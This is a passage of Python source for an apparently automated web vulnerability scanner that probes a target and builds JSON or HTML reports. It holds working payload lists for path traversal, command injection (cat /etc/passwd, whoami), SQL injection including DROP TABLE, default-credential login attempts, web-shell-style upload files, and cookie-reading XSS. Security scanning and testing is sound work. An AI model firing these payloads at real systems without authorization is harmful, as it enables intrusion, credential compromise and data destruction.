                    f"{self.target}?document={payload}",
                    f"{self.target}?load={payload}",
                    f"{self.target}?show={payload}",
                    f"{self.target}?read={payload}"
                ]
                
                for test_url in test_urls:
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        for signature in file_signatures:
                            if signature in response.text:
                                result['vulnerable'] = True
                                result['responses'].append({
                                    'payload': payload,
                                    'file_disclosed': True,
                                    'url': test_url,
                                    'signature_found': signature,
                                    'context': 'URL parameter'
                                })
                                
                                # Identify accessed file
                                if 'root:' in response.text:
                                    result['files_accessed'].append('/etc/passwd')
                                elif 'localhost' in response.text:
                                    result['files_accessed'].append('hosts file')
                                elif '[fonts]' in response.text:
                                    result['files_accessed'].append('win.ini')
                                elif 'Linux version' in response.text:
                                    result['files_accessed'].append('/proc/version')
                                
                                break
                        
                        if result['vulnerable']:
                            break
                    except Exception as e:
                        logger.debug(f"Directory traversal test failed for {test_url}: {e}")
                        continue
                
                if result['vulnerable']:
                    break
            
            # Test forms if available and not already vulnerable
            if not result['vulnerable'] and forms_data.get('forms'):
                for form in forms_data['forms']:
                    if not form['inputs']:
                        continue
                        
                    form_url = self.target
                    if form['action']:
                        if form['action'].startswith('http'):
                            form_url = form['action']
                        else:
                            form_url = f"{self.target.rstrip('/')}/{form['action'].lstrip('/')}"
                    
                    for payload in payloads[:10]:  # Test subset for forms
                        form_data = {}
                        
                        for input_field in form['inputs']:
                            if input_field['name'] and input_field['type'] not in ['submit', 'button', 'password']:
                                form_data[input_field['name']] = payload
                        
                        if not form_data:
                            continue
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            for signature in file_signatures:
                                if signature in response.text:
                                    result['vulnerable'] = True
                                    result['technique'] = 'Path traversal via form'
                                    result['responses'].append({
                                        'payload': payload,
                                        'file_disclosed': True,
                                        'url': form_url,
                                        'signature_found': signature,
                                        'context': 'Form input',
                                        'form_method': form['method']
                                    })
                                    break
                            
                            if result['vulnerable']:
                                break
                        except Exception as e:
                            logger.debug(f"Form directory traversal test failed: {e}")
                            continue
                    
                    if result['vulnerable']:
                        break
                
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"Directory traversal testing failed: {e}")
        
        return result
    
    def _test_command_injection(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Test for command injection vulnerabilities"""
        payloads = [
            # Basic command injection
            '; cat /etc/passwd',
            '& type c:\\windows\\win.ini',
            '| cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            
            # Time-based detection
            '; sleep 5',
            '& timeout 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            
            # Error-based detection
            '; cat /nonexistent/file',
            '& type c:\\nonexistent\\file',
            '| cat /dev/null/nonexistent',
            '`cat /etc/passwd-nonexistent`',
            '$(cat /etc/passwd-nonexistent)',
            
            # Encoded payloads
            '%3bcat%20/etc/passwd',
            '%26type%20c%3a%5cwindows%5cwin.ini',
            '%7ccat%20/etc/passwd',
            
            # Different separators
            '&&cat /etc/passwd',
            '||cat /etc/passwd',
            ';cat /etc/passwd',
            '|cat /etc/passwd',
            '&cat /etc/passwd',
            
            # Platform-specific
            '; uname -a',  # Linux
            '& ver',  # Windows
            '; id',  # Unix
            '& whoami',  # Windows
            '; ps aux',  # Linux
            '& tasklist',  # Windows
        ]
        
        result = {
            'vulnerable': False,
            'payloads_tested': len(payloads),
            'responses': [],
            'technique': 'Command injection'
        }
        
        # Command execution indicators
        command_indicators = [
            'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            'uid=', 'gid=', 'groups=',  # id command
            'Linux', 'Darwin', 'Windows',  # uname/ver
            'Microsoft Windows', 'Version',  # Windows ver
            'PID', 'TTY', 'STAT', 'TIME',  # ps aux
            'Image Name', 'Session Name',  # tasklist
            'for 16-bit app support', '[fonts]'  # win.ini
        ]
        
        try:
            # Test URL parameters
            for payload in payloads:
                test_urls = [
                    f"{self.target}?cmd={payload}",
                    f"{self.target}?exec={payload}",
                    f"{self.target}?command={payload}",
                    f"{self.target}?system={payload}",
                    f"{self.target}?ping={payload}",
                    f"{self.target}?host={payload}",
                    f"{self.target}?ip={payload}",
                    f"{self.target}?shell={payload}",
                    f"{self.target}?run={payload}",
                    f"{self.target}?execute={payload}"
                ]
                
                for test_url in test_urls:
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        for indicator in command_indicators:
                            if indicator in response.text:
                                result['vulnerable'] = True
                                result['responses'].append({
                                    'payload': payload,
                                    'command_executed': True,
                                    'url': test_url,
                                    'indicator_found': indicator,
                                    'context': 'URL parameter'
                                })
                                break
                        
                        if result['vulnerable']:
                            break
                    except Exception as e:
                        logger.debug(f"Command injection test failed for {test_url}: {e}")
                        continue
                
                if result['vulnerable']:
                    break
            
            # Test forms if available and not already vulnerable
            if not result['vulnerable'] and forms_data.get('forms'):
                for form in forms_data['forms']:
                    if not form['inputs']:
                        continue
                        
                    form_url = self.target
                    if form['action']:
                        if form['action'].startswith('http'):
                            form_url = form['action']
                        else:
                            form_url = f"{self.target.rstrip('/')}/{form['action'].lstrip('/')}"
                    
                    for payload in payloads[:10]:  # Test subset for forms
                        form_data = {}
                        
                        for input_field in form['inputs']:
                            if input_field['name'] and input_field['type'] not in ['submit', 'button', 'password', 'hidden']:
                                form_data[input_field['name']] = payload
                        
                        if not form_data:
                            continue
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            for indicator in command_indicators:
                                if indicator in response.text:
                                    result['vulnerable'] = True
                                    result['technique'] = 'Command injection via form'
                                    result['responses'].append({
                                        'payload': payload,
                                        'command_executed': True,
                                        'url': form_url,
                                        'indicator_found': indicator,
                                        'context': 'Form input',
                                        'form_method': form['method']
                                    })
                                    break
                            
                            if result['vulnerable']:
                                break
                        except Exception as e:
                            logger.debug(f"Form command injection test failed: {e}")
                            continue
                    
                    if result['vulnerable']:
                        break
                
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"Command injection testing failed: {e}")
        
        return result
    
    def _test_csrf(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Test for CSRF vulnerabilities"""
        result = {
            'vulnerable': False,
            'forms_tested': 0,
            'responses': [],
            'technique': 'CSRF token analysis'
        }
        
        if not forms_data.get('forms'):
            result['error'] = 'No forms found to test'
            return result
        
        try:
            csrf_token_names = [
                'csrf_token', 'csrf', '_token', 'token', 'authenticity_token',
                'csrfmiddlewaretoken', 'csrftoken', '_csrf', 'csrf_value',
                'security_token', 'form_token', 'xsrf_token', 'xsrf'
            ]
            
            for form in forms_data['forms']:
                if form['method'].upper() in ['POST', 'PUT', 'DELETE']:
                    result['forms_tested'] += 1
                    
                    # Check if form has CSRF protection
                    has_csrf_token = False
                    csrf_token_found = []
                    
                    for input_field in form['inputs']:
                        if input_field['name'].lower() in csrf_token_names:
                            has_csrf_token = True
                            csrf_token_found.append(input_field['name'])
                    
                    if not has_csrf_token:
                        result['vulnerable'] = True
                        result['responses'].append({
                            'form_action': form['action'],
                            'form_method': form['method'],
                            'csrf_protection': False,
                            'vulnerability': 'No CSRF token found',
                            'context': 'Form analysis'
                        })
                    else:
                        result['responses'].append({
                            'form_action': form['action'],
                            'form_method': form['method'],
                            'csrf_protection': True,
                            'csrf_tokens_found': csrf_token_found,
                            'context': 'Form analysis'
                        })
        
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"CSRF testing failed: {e}")
        
        return result
    
    def _test_file_upload_vulnerabilities(self, file_upload_forms: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Test for file upload vulnerabilities"""
        result = {
            'vulnerable': False,
            'forms_tested': len(file_upload_forms),
            'responses': [],
            'technique': 'File upload analysis'
        }
        
        if not file_upload_forms:
            result['error'] = 'No file upload forms found'
            return result
        
        try:
            # Test file types that might be dangerous
            test_files = [
                ('shell.php', '<?php phpinfo(); ?>', 'application/x-php'),
                ('shell.jsp', '<% Runtime.getRuntime().exec("whoami"); %>', 'application/x-jsp'),
                ('shell.asp', '<% Response.Write("ASP Shell") %>', 'application/x-asp'),
                ('shell.aspx', '<% Response.Write("ASPX Shell") %>', 'application/x-aspx'),
                ('test.html', '<script>alert("XSS")</script>', 'text/html'),
                ('test.svg', '<svg onload="alert(\'XSS\')">', 'image/svg+xml'),
                ('test.exe', 'MZ\x90\x00\x03\x00\x00\x00', 'application/x-executable'),
                ('test.bat', '@echo off\necho "Batch file"', 'application/x-bat'),
                ('test.sh', '#!/bin/bash\necho "Shell script"', 'application/x-sh'),
                ('test.py', 'import os\nprint("Python script")', 'text/x-python'),
            ]
            
            for form in file_upload_forms:
                form_url = self.target
                if form['action']:
                    if form['action'].startswith('http'):
                        form_url = form['action']
                    else:
                        form_url = f"{self.target.rstrip('/')}/{form['action'].lstrip('/')}"
                
                # Find file input field
                file_input = None
                for input_field in form['inputs']:
                    if input_field['type'] == 'file':
                        file_input = input_field
                        break
                
                if not file_input or not file_input['name']:
                    continue
                
                for filename, content, mime_type in test_files[:3]:  # Test first 3 file types
                    try:
                        # Prepare form data
                        form_data = {}
                        for input_field in form['inputs']:
                            if input_field['name'] and input_field['type'] not in ['submit', 'button', 'file']:
                                form_data[input_field['name']] = input_field.get('value', 'test')
                        
                        # Prepare file upload
                        files = {
                            file_input['name']: (filename, content, mime_type)
                        }
                        
                        if form['method'] == 'POST':
                            response = self.session.post(form_url, data=form_data, files=files, timeout=self.timeout)
                        else:
                            # GET method with file upload is unusual but possible
                            response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                        
                        # Check for successful upload indicators
                        success_indicators = [
                            'uploaded successfully', 'upload complete', 'file saved',
                            'upload successful', 'file uploaded', 'saved successfully',
                            filename, 'phpinfo()', 'ASP Shell', 'ASPX Shell'
                        ]
                        
                        response_lower = response.text.lower()
                        for indicator in success_indicators:
                            if indicator.lower() in response_lower:
                                result['vulnerable'] = True
                                result['responses'].append({
                                    'filename': filename,
                                    'upload_successful': True,
                                    'url': form_url,
                                    'indicator_found': indicator,
                                    'context': 'File upload form',
                                    'form_method': form['method']
                                })
                                break
                        
                        if result['vulnerable']:
                            break
                    except Exception as e:
                        logger.debug(f"File upload test failed for {filename}: {e}")
                        continue
                
                if result['vulnerable']:
                    break
        
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"File upload testing failed: {e}")
        
        return result
    
    def _test_authentication_bypass(self) -> Dict[str, Any]:
        """Test for authentication bypass vulnerabilities"""
        result = {
            'vulnerable': False,
            'tests_performed': 0,
            'responses': [],
            'technique': 'Authentication bypass'
        }
        
        try:
            # Test common authentication bypass techniques
            bypass_payloads = [
                # SQL injection in login
                ("' OR '1'='1' --", "password"),
                ("admin' --", "password"),
                ("' OR 1=1 --", "password"),
                ("admin", "' OR '1'='1' --"),
                ("admin", "' OR 1=1 --"),
                
                # Default credentials
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "root"),
                ("root", "password"),
                ("administrator", "administrator"),
                ("guest", "guest"),
                ("user", "user"),
                ("test", "test"),
                ("demo", "demo"),
                
                # Empty credentials
                ("", ""),
                ("admin", ""),
                ("", "password"),
                
                # Common usernames with empty passwords
                ("admin", ""),
                ("root", ""),
                ("administrator", ""),
                ("guest", ""),
                ("user", ""),
            ]
            
            # Common login endpoints
            login_endpoints = [
                '/login',
                '/admin/login',
                '/user/login',
                '/auth/login',
                '/signin',
                '/admin',
                '/administrator',
                '/wp-login.php',
                '/wp-admin',
                '/admin.php',
                '/login.php',
                '/user.php',
                '/auth.php',
                '/panel',
                '/dashboard',
                '/control',
                '/management',
            ]
            
            base_url = self.target.rstrip('/')
            
            for endpoint in login_endpoints:
                test_url = f"{base_url}{endpoint}"
                
                try:
                    # First, try to access the login page
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        result['tests_performed'] += 1
                        
                        # Check if it's a login page
                        login_indicators = [
                            'login', 'signin', 'username', 'password', 'auth',
                            'email', 'user', 'admin', 'administrator'
                        ]
                        
                        response_lower = response.text.lower()
                        is_login_page = any(indicator in response_lower for indicator in login_indicators)
                        
                        if is_login_page:
                            # Try to find forms with username/password fields
                            forms_data = self._discover_forms_from_response(response.text)
                            
                            for form in forms_data.get('forms', []):
                                if self._is_login_form(form):
                                    # Test bypass payloads
                                    for username, password in bypass_payloads[:10]:  # Test first 10
                                        form_data = {}
                                        
                                        for input_field in form['inputs']:
                                            field_name = input_field['name'].lower()
                                            if any(keyword in field_name for keyword in ['user', 'login', 'email']):
                                                form_data[input_field['name']] = username
                                            elif any(keyword in field_name for keyword in ['pass', 'pwd']):
                                                form_data[input_field['name']] = password
                                            elif input_field['type'] not in ['submit', 'button', 'hidden']:
                                                form_data[input_field['name']] = input_field.get('value', '')
                                        
                                        if len(form_data) >= 2:  # At least username and password
                                            form_url = test_url
                                            if form['action']:
                                                if form['action'].startswith('http'):
                                                    form_url = form['action']
                                                else:
                                                    form_url = f"{base_url}{form['action']}"
                                            
                                            try:
                                                if form['method'] == 'POST':
                                                    login_response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                                                else:
                                                    login_response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                                                
                                                # Check for successful login indicators
                                                success_indicators = [
                                                    'welcome', 'dashboard', 'logout', 'profile',
                                                    'admin panel', 'control panel', 'management',
                                                    'successfully logged in', 'login successful'
                                                ]
                                                
                                                login_response_lower = login_response.text.lower()
                                                
                                                for indicator in success_indicators:
                                                    if indicator in login_response_lower:
                                                        result['vulnerable'] = True
                                                        result['responses'].append({
                                                            'username': username,
                                                            'password': password,
                                                            'login_successful': True,
                                                            'url': form_url,
                                                            'indicator_found': indicator,
                                                            'context': 'Authentication bypass'
                                                        })
                                                        break
                                                
                                                if result['vulnerable']:
                                                    break
                                            except Exception as e:
                                                logger.debug(f"Authentication bypass test failed: {e}")
                                                continue
                                    
                                    if result['vulnerable']:
                                        break
                            
                            if result['vulnerable']:
                                break
                except Exception as e:
                    logger.debug(f"Login endpoint test failed for {test_url}: {e}")
                    continue
            
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"Authentication bypass testing failed: {e}")
        
        return result
    
    def _discover_forms_from_response(self, html_content: str) -> Dict[str, Any]:
        """Discover forms from HTML content"""
        try:
            if BS4_AVAILABLE:
                soup = BeautifulSoup(html_content, 'html.parser')
                forms_data = {'forms': []}
                
                for form in soup.find_all('form'):
                    form_data = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_elem in form.find_all(['input', 'textarea', 'select']):
                        input_data = {
                            'name': input_elem.get('name', ''),
                            'type': input_elem.get('type', 'text'),
                            'value': input_elem.get('value', ''),
                            'element_type': input_elem.name
                        }
                        form_data['inputs'].append(input_data)
                    
                    forms_data['forms'].append(form_data)
                
                return forms_data
            else:
                # Basic regex-based form discovery
                import re
                forms_data = {'forms': []}
                
                form_pattern = r'<form[^>]*>(.*?)</form>'
                forms = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
                
                for form in forms:
                    form_data = {
                        'action': '',
                        'method': 'GET',
                        'inputs': []
                    }
                    
                    # Extract action and method
                    action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form, re.IGNORECASE)
                    if action_match:
                        form_data['action'] = action_match.group(1)
                    
                    method_match = re.search(r'method\s*=\s*["\']([^"\']*)["\']', form, re.IGNORECASE)
                    if method_match:
                        form_data['method'] = method_match.group(1).upper()
                    
                    # Extract inputs
                    input_pattern = r'<input[^>]*>'
                    inputs = re.findall(input_pattern, form, re.IGNORECASE)
                    
                    for inp in inputs:
                        input_data = {'name': '', 'type': 'text', 'value': ''}
                        
                        name_match = re.search(r'name\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
                        if name_match:
                            input_data['name'] = name_match.group(1)
                        
                        type_match = re.search(r'type\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
                        if type_match:
                            input_data['type'] = type_match.group(1)
                        
                        value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
                        if value_match:
                            input_data['value'] = value_match.group(1)
                        
                        form_data['inputs'].append(input_data)
                    
                    forms_data['forms'].append(form_data)
                
                return forms_data
        except Exception as e:
            logger.error(f"Form discovery failed: {e}")
            return {'forms': []}
    
    def _is_login_form(self, form: Dict[str, Any]) -> bool:
        """Check if a form is a login form"""
        username_fields = ['user', 'username', 'email', 'login', 'userid', 'account']
        password_fields = ['pass', 'password', 'pwd', 'passwd']
        
        has_username = False
        has_password = False
        
        for input_field in form['inputs']:
            field_name = input_field['name'].lower()
            field_type = input_field['type'].lower()
            
            if any(keyword in field_name for keyword in username_fields):
                has_username = True
            elif any(keyword in field_name for keyword in password_fields) or field_type == 'password':
                has_password = True
        
        return has_username and has_password
    
    def _test_sql_injection(self) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT 1,2,3 --"
        ]
        
        result = {'vulnerable': False, 'payloads_tested': len(payloads), 'responses': []}
        
        try:
            for payload in payloads:
                # Test in URL parameters
                test_url = f"{self.target}?id={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Look for SQL error messages
                sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'microsoft jet database', 'odbc drivers error']
                response_lower = response.text.lower()
                
                for error in sql_errors:
                    if error in response_lower:
                        result['vulnerable'] = True
                        result['responses'].append({
                            'payload': payload,
                            'error_found': error,
                            'url': test_url
                        })
                        break
                
                if result['vulnerable']:
                    break
                
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def _test_directory_traversal(self) -> Dict[str, Any]:
        """Test for directory traversal vulnerabilities"""
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        result = {'vulnerable': False, 'payloads_tested': len(payloads), 'responses': []}
        
        try:
            for payload in payloads:
                # Test in URL parameters
                test_url = f"{self.target}?file={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Look for system file contents
                if 'root:' in response.text or 'localhost' in response.text:
                    result['vulnerable'] = True
                    result['responses'].append({
                        'payload': payload,
                        'file_disclosed': True,
                        'url': test_url
                    })
                    break
                
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def _technology_detection(self) -> Dict[str, Any]:
        """Detect technologies used by the target"""
        test_result = {
            'test_name': 'Technology Detection',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            
            # Server identification
            server_header = response.headers.get('Server', '')
            test_result['details']['server'] = server_header
            
            # Technology detection from headers
            technologies = []
            
            # Check headers for technology indicators
            tech_headers = {
                'X-Powered-By': response.headers.get('X-Powered-By', ''),
                'X-AspNet-Version': response.headers.get('X-AspNet-Version', ''),
                'X-Framework': response.headers.get('X-Framework', ''),
                'X-Generator': response.headers.get('X-Generator', '')
            }
            
            for header, value in tech_headers.items():
                if value:
                    technologies.append(f"{header}: {value}")
            
            # Content-based detection
            if BS4_AVAILABLE:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # CMS Detection
                cms_indicators = {
                    'WordPress': ['wp-content', 'wp-includes', '/wp-json/'],
                    'Joomla': ['joomla', '/media/jui/'],
                    'Drupal': ['drupal', '/sites/default/'],
                    'Magento': ['magento', '/skin/frontend/'],
                    'Shopify': ['shopify', 'shopify.com'],
                    'Squarespace': ['squarespace', 'static1.squarespace.com'],
                    'Wix': ['wix.com', 'static.wixstatic.com']
                }
                
                content_str = response.text.lower()
                detected_cms = []
                
                for cms, indicators in cms_indicators.items():
                    for indicator in indicators:
                        if indicator in content_str:
                            detected_cms.append(cms)
                            break
                
                test_result['details']['cms_detected'] = detected_cms
                test_result['details']['technologies'] = technologies
            
            test_result['status'] = 'success'
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Technology detection failed: {e}")
        
        return test_result
    
    def _information_disclosure(self) -> Dict[str, Any]:
        """Check for information disclosure"""
        test_result = {
            'test_name': 'Information Disclosure',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            sensitive_paths = [
                '/robots.txt',
                '/sitemap.xml',
                '/.env',
                '/.git/',
                '/admin/',
                '/wp-admin/',
                '/phpmyadmin/',
                '/adminer/',
                '/debug/',
                '/test/',
                '/backup/',
                '/config/',
                '/error.log',
                '/access.log'
            ]
            
            accessible_paths = []
            
            for path in sensitive_paths:
                try:
                    url = f"{self.target.rstrip('/')}{path}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        accessible_paths.append({
                            'path': path,
                            'url': url,
                            'status_code': response.status_code,
                            'content_length': len(response.content)
                        })
                except Exception:
                    continue
            
            test_result['details']['accessible_paths'] = accessible_paths
            test_result['details']['sensitive_files_found'] = len(accessible_paths)
            test_result['status'] = 'success'
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Information disclosure check failed: {e}")
        
        return test_result
    
    def _advanced_vulnerability_scan(self) -> Dict[str, Any]:
        """Run advanced vulnerability scan using sophisticated detection methods"""
        test_result = {
            'test_name': 'Advanced Vulnerability Scan',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            # Get forms data for advanced testing
            forms_data = self._discover_forms()
            
            # Initialize advanced scan results
            advanced_results = {
                'vulnerabilities': [],
                'techniques_used': [],
                'forms_analyzed': len(forms_data.get('forms', [])),
                'payloads_tested': 0,
                'contexts_tested': set(),
                'attack_vectors': []
            }
            
            # Run comprehensive vulnerability tests
            logger.info("Running advanced vulnerability detection...")
            
            # 1. Advanced XSS Testing with multiple contexts
            xss_result = self._advanced_xss_testing(forms_data)
            if xss_result.get('vulnerabilities'):
                advanced_results['vulnerabilities'].extend(xss_result['vulnerabilities'])
                advanced_results['techniques_used'].extend(xss_result.get('techniques', []))
                advanced_results['payloads_tested'] += xss_result.get('payloads_tested', 0)
                advanced_results['contexts_tested'].update(xss_result.get('contexts', []))
            
            # 2. Advanced SQL Injection with blind detection
            sqli_result = self._advanced_sqli_testing(forms_data)
            if sqli_result.get('vulnerabilities'):
                advanced_results['vulnerabilities'].extend(sqli_result['vulnerabilities'])
                advanced_results['techniques_used'].extend(sqli_result.get('techniques', []))
                advanced_results['payloads_tested'] += sqli_result.get('payloads_tested', 0)
                advanced_results['contexts_tested'].update(sqli_result.get('contexts', []))
            
            # 3. Advanced Directory Traversal with encoding variations
            path_traversal_result = self._advanced_path_traversal_testing(forms_data)
            if path_traversal_result.get('vulnerabilities'):
                advanced_results['vulnerabilities'].extend(path_traversal_result['vulnerabilities'])
                advanced_results['techniques_used'].extend(path_traversal_result.get('techniques', []))
                advanced_results['payloads_tested'] += path_traversal_result.get('payloads_tested', 0)
            
            # 4. Business Logic Testing
            business_logic_result = self._test_business_logic_flaws(forms_data)
            if business_logic_result.get('vulnerabilities'):
                advanced_results['vulnerabilities'].extend(business_logic_result['vulnerabilities'])
                advanced_results['techniques_used'].extend(business_logic_result.get('techniques', []))
            
            # 5. Session Management Testing
            session_result = self._test_session_management()
            if session_result.get('vulnerabilities'):
                advanced_results['vulnerabilities'].extend(session_result['vulnerabilities'])
                advanced_results['techniques_used'].extend(session_result.get('techniques', []))
            
            # Convert contexts set to list for JSON serialization
            advanced_results['contexts_tested'] = list(advanced_results['contexts_tested'])
            
            # Extract results
            test_result['details'] = advanced_results
            test_result['status'] = 'success'
            
            # Log findings
            if advanced_results.get('vulnerabilities'):
                logger.info(f"Advanced scan found {len(advanced_results['vulnerabilities'])} vulnerabilities")
                for vuln in advanced_results['vulnerabilities']:
                    logger.info(f"  - {vuln['type']}: {vuln['severity']}")
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Advanced vulnerability scan failed: {e}")
        
        return test_result
    
    async def run_comprehensive_scan(self) -> Dict[str, Any]:
        """Run comprehensive security scan"""
        logger.info(f"Starting comprehensive scan for {self.target}")
        
        # Define all security tests
        security_tests = [
            ('connectivity', self._test_connectivity),
            ('port_scan', self._port_scan),
            ('security_headers', self._security_headers_check),
            ('ssl_analysis', self._ssl_analysis),
            ('vulnerability_scan', self._vulnerability_scan),
            ('technology_detection', self._technology_detection),
            ('information_disclosure', self._information_disclosure),
            ('advanced_vulnerability_scan', self._advanced_vulnerability_scan)
        ]
        
        scan_results = {
            'scan_id': self.scan_id,
            'target': self.target,
            'domain': self.domain,
            'start_time': self.start_time.isoformat(),
            'tests': {},
            'summary': {
                'total_tests': len(security_tests),
                'completed_tests': 0,
                'failed_tests': 0,
                'vulnerabilities_found': 0
            }
        }
        
        # Execute tests
        for i, (test_name, test_func) in enumerate(security_tests):
            try:
                progress = ((i + 1) / len(security_tests)) * 100
                self._update_progress(progress, f"Running {test_name.replace('_', ' ').title()}")
                
                # Run test
                result = test_func()
                scan_results['tests'][test_name] = result
                
                # Update summary
                if result['status'] == 'success':
                    scan_results['summary']['completed_tests'] += 1
                else:
                    scan_results['summary']['failed_tests'] += 1
                
                # Count vulnerabilities
                if 'vulnerabilities' in result.get('details', {}):
                    scan_results['summary']['vulnerabilities_found'] += len(result['details']['vulnerabilities'])
                
            except Exception as e:
                logger.error(f"Test {test_name} failed: {e}")
                scan_results['tests'][test_name] = {
                    'test_name': test_name,
                    'status': 'error',
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                }
                scan_results['summary']['failed_tests'] += 1
        
        # Finalize scan
        scan_results['end_time'] = datetime.now().isoformat()
        scan_results['duration'] = (datetime.now() - self.start_time).total_seconds()
        
        self._update_progress(100, "Scan completed successfully")
        
        # Store results
        self.scan_results = scan_results
        
        logger.info(f"Scan completed for {self.target}")
        return scan_results
    
    def generate_report(self, format_type: str = 'json') -> str:
        """Generate scan report in specified format"""
        if not self.scan_results:
            raise ValueError("No scan results available")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"security_report_{self.scan_id}_{timestamp}.{format_type}"
        
        if format_type == 'json':
            with open(filename, 'w') as f:
                json.dump(self.scan_results, f, indent=2)
        
        elif format_type == 'html':
            html_content = self._generate_html_report()
            with open(filename, 'w') as f:
                f.write(html_content)
        
        else:
            raise ValueError(f"Unsupported format: {format_type}")
        
        logger.info(f"Report generated: {filename}")
        return filename
    
    def _generate_html_report(self) -> str:
        """Generate HTML report"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Scan Report - {target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #333; color: white; padding: 20px; text-align: center; }}
                .summary {{ background: #f4f4f4; padding: 15px; margin: 20px 0; }}
                .test-result {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; }}
                .success {{ border-left: 5px solid #4CAF50; }}
                .error {{ border-left: 5px solid #f44336; }}
                .warning {{ border-left: 5px solid #ff9800; }}
                .vulnerability {{ background: #ffebee; padding: 10px; margin: 10px 0; }}
                pre {{ background: #f5f5f5; padding: 10px; overflow-x: auto; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Security Scan Report</h1>
                <p>Target: {target}</p>
                <p>Scan ID: {scan_id}</p>
                <p>Generated: {timestamp}</p>
            </div>
            
            <div class="summary">
                <h2>Executive Summary</h2>
                <p><strong>Total Tests:</strong> {total_tests}</p>
                <p><strong>Completed Tests:</strong> {completed_tests}</p>
                <p><strong>Failed Tests:</strong> {failed_tests}</p>
                <p><strong>Vulnerabilities Found:</strong> {vulnerabilities_found}</p>
                <p><strong>Duration:</strong> {duration:.2f} seconds</p>
            </div>
            
            <div class="test-results">
                <h2>Test Results</h2>
                {test_results_html}
            </div>
        </body>
        </html>
        """
        
        # Generate test results HTML
        test_results_html = ""
        for test_name, result in self.scan_results.get('tests', {}).items():
            status_class = result.get('status', 'unknown')
            test_results_html += f"""
            <div class="test-result {status_class}">
                <h3>{result.get('test_name', test_name).replace('_', ' ').title()}</h3>
                <p><strong>Status:</strong> {result.get('status', 'Unknown')}</p>
                <p><strong>Timestamp:</strong> {result.get('timestamp', 'N/A')}</p>
                {f"<p><strong>Error:</strong> {result.get('error', '')}</p>" if result.get('error') else ""}
                {f"<pre>{json.dumps(result.get('details', {}), indent=2)}</pre>" if result.get('details') else ""}
            </div>
            """
        
        return html_template.format(
            target=self.target,
            scan_id=self.scan_id,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            total_tests=self.scan_results['summary']['total_tests'],
            completed_tests=self.scan_results['summary']['completed_tests'],
            failed_tests=self.scan_results['summary']['failed_tests'],
            vulnerabilities_found=self.scan_results['summary']['vulnerabilities_found'],
            duration=self.scan_results.get('duration', 0),
            test_results_html=test_results_html
        )

    def _advanced_xss_testing(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Advanced XSS testing with multiple contexts and encodings"""
        result = {
            'vulnerabilities': [],
            'techniques': ['Context-aware XSS testing', 'Encoding bypass testing', 'Event-based XSS'],
            'payloads_tested': 0,
            'contexts': []
        }
        
        # Advanced XSS payloads with different contexts
        advanced_payloads = [
            # DOM-based XSS
            {'payload': '<img src=x onerror=alert(document.domain)>', 'context': 'DOM'},
            {'payload': '<svg onload=alert(document.cookie)>', 'context': 'DOM'},
            
